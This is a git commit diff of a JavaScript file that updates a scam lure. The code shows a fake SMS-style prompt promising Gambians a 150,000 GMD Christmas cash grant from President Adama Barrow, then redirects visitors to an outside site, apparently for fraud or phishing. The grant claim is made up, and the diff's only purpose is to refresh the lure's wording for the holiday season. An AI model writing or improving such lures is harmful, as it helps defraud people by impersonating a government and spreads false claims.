3cd0e98816d4961030d3e6e0f70c6719d8c035fd
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-11-19 22:28:40 -0800

    Update gambian-active.js

--- gambian-active.js
+++ gambian-active.js
@@ -1,6 +1,6 @@
 
-var password = 'WITHDRAW 150,000GMD'
-password=prompt('SMS: Congratulations You are qualify for President ADAMA BARROW 150,000GMD CASH GRANT FOR GAMBIANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 150,000GMD');
-if (password != 'WITHDRAW 150,000GMD') {
+var password = '150,000GMD X-MAS GRANT'
+password=prompt('SMS: Congratulations You are qualify for President ADAMA BARROW 150,000GMD CHRISTMAS CASH GRANT FOR GAMBIANS, Kindly Press OK to Withdraw X-Mas Cash Grant   ','150,000GMD X-MAS GRANT');
+if (password != '150,000GMD X-MAS GRANT') {
 location.href='https://all-free-byt.org/gambian-grant.html';
 }
